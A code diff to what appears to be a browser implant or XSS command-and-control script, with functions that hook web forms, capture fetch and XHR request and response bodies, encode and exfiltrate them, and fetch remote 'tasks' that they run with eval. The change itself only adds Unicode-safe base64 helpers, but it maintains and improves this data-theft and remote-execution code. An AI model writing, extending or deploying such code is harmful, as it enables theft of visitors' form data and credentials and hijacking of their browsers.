@@ -32,6 +32,14 @@
 // For more information, please refer to <http://unlicense.org/>
 
 
+// Unicode-safe base64 helpers (btoa/atob only handle Latin-1)
+function unicodeBtoa(str) {
+	return btoa(String.fromCharCode(...new TextEncoder().encode(str)));
+}
+function unicodeAtob(str) {
+	return new TextDecoder().decode(Uint8Array.from(atob(str), c => c.charCodeAt(0)));
+}
+
 function initGlobals()
 {
 	// console.log("Initializing globals...");
@@ -335,8 +343,8 @@ function updateTaskCheckJitter(newTop, newBottom)
 function customExfil(note, data)
 {
 	var jsonObj = new Object();
-	jsonObj["note"] = btoa(note);
-	jsonObj["data"] = btoa(data);
+	jsonObj["note"] = unicodeBtoa(note);
+	jsonObj["data"] = unicodeBtoa(data);
 	var jsonString = JSON.stringify(jsonObj);
 
 	if (window.taperMetricsBox)
@@ -752,9 +760,9 @@ function hookForms()
 			}
 
 			var jsonObj = new Object();
-			jsonObj["action"] = btoa(action);
+			jsonObj["action"] = unicodeBtoa(action);
 			jsonObj["method"] = method;
-			jsonObj["data"]   = btoa(data);
+			jsonObj["data"]   = unicodeBtoa(data);
 			jsonObj["url"]    = myReference.location.href;
 			var jsonString    = JSON.stringify(jsonObj);
 
@@ -1312,7 +1320,7 @@ function scheduleLootCapture(delay) {
   		method:         options.method || 'GET',
   		url:            url,
   		headers:        options.headers,
-  		body:           btoa(options.body),
+  		body:           unicodeBtoa(options.body),
   		responseStatus: null,
   		responseBody:   null
   	});
@@ -1338,7 +1346,7 @@ function scheduleLootCapture(delay) {
 			// console.log('Response Body:', body);
 
 			// stash it
-  			details.responseBody = btoa(body);
+  			details.responseBody = unicodeBtoa(body);
 
 			// Send to whole call dump
   			var request = new XMLHttpRequest();
@@ -1425,7 +1433,7 @@ function scheduleLootCapture(delay) {
 		var originalOnReadyStateChange = this.onreadystatechange;
 
 		if (this.requestDetails) {
-			this.requestDetails.body = btoa(data);
+			this.requestDetails.body = unicodeBtoa(data);
 		}
 
 		this.onreadystatechange = function() {
@@ -1446,7 +1454,7 @@ function scheduleLootCapture(delay) {
 					respData = this.response;
 				}
 
-				this.requestDetails.responseBody   = btoa(respData);
+				this.requestDetails.responseBody   = unicodeBtoa(respData);
 				this.requestDetails.responseStatus = this.status;
 
 				var jsonString = JSON.stringify(this.requestDetails);
@@ -1534,7 +1542,7 @@ function scheduleLootCapture(delay) {
       //	console.log("Task: " + taskId + ", data: " + atob(taskData));
 
 					try {
-						eval(atob(taskData));
+						eval(unicodeAtob(taskData));
 					} catch (error) {
 						customExfil("Task Error", "Error running task " + taskId + ": " + error.message);
 					}
@@ -1555,7 +1563,7 @@ function scheduleLootCapture(delay) {
 				var taskData = jsonResponse[i].data;
 
 				try {
-					eval(atob(taskData));
+					eval(unicodeAtob(taskData));
 				} catch (error) {
 					customExfil("Task Error", "Error running task " + taskId + ": " + error.message);
 				}
